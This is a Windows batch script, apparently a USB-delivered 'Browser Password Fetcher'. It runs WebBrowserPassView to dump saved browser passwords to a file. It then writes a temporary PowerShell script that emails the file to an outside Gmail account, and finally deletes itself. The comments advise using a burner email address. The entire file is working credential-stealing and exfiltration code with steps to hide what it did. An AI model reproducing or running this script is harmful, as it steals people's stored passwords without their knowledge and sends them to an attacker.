:: ***** Browser Password Fetcher *****

:: Dont display commands in cmd prompt
@ECHO OFF

:: Run password grabber from USB location
start %cd%\Tool\WebBrowserPassView.exe /stext Tool\WebBrowserPassView.txt

:: Set Variables for email account details to send results to + attachment location. Recommend using a burner email address
SET GmailUser= 
SET GmailPass=
SET Attachment="%cd%Tool\WebBrowserPassView.txt"

:: Run powershell to configure and send email
CALL :EmailPowerShell
CD /D "%PowerShellDir%"
Powershell -ExecutionPolicy Bypass -Command "& '%EmailCreds%' '%GmailUser%' '%GmailPass%' '%Attachment%'"

:: Delete the script entirely via "%~FN0" where 0 is the script
IF EXIST "%~FN0" DEL /Q /F "%~FN0"
EXIT

:EmailPowerShell - You will need to set 'EmailTo' & 'EmailFrom' variables
SET PowerShellDir=C:\Windows\System32\WindowsPowerShell\v1.0
SET EmailCreds=%temp%\~tmpSendEmail.ps1
IF EXIST "%EmailCreds%" DEL /Q /F "%EmailCreds%"
ECHO $Username      = $args[0]>> "%EmailCreds%"
ECHO $EmailPassword = $args[1]>> "%EmailCreds%"
ECHO $Attachment    = $args[2]>> "%EmailCreds%"
ECHO $Username    = $Username                 >> "%EmailCreds%"
ECHO $EmailTo     = "@gmail.com" >> "%EmailCreds%"
ECHO $EmailFrom   = "@gmail.com" >> "%EmailCreds%"
ECHO $Subject     = "Passwords"           >> "%EmailCreds%"
ECHO $Body        = "Passwords are attached"              >> "%EmailCreds%"
ECHO $SMTPServer  = "smtp.gmail.com"          >> "%EmailCreds%"
ECHO $SMTPMessage = New-Object System.Net.Mail.MailMessage($EmailFrom, $EmailTo, $Subject, $Body) >> "%EmailCreds%"
ECHO $Attachment  = New-Object System.Net.Mail.Attachment($Attachment)                            >> "%EmailCreds%"
ECHO $SMTPMessage.Attachments.Add($Attachment)                                                    >> "%EmailCreds%"
ECHO $SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587)                               >> "%EmailCreds%"
ECHO $SMTPClient.EnableSsl = $true                                                                >> "%EmailCreds%"
ECHO $SMTPClient.Credentials = New-Object System.Net.NetworkCredential($Username, $EmailPassword) >> "%EmailCreds%"
ECHO $SMTPClient.Send($SMTPMessage)                                                               >> "%EmailCreds%"

GOTO :EOF




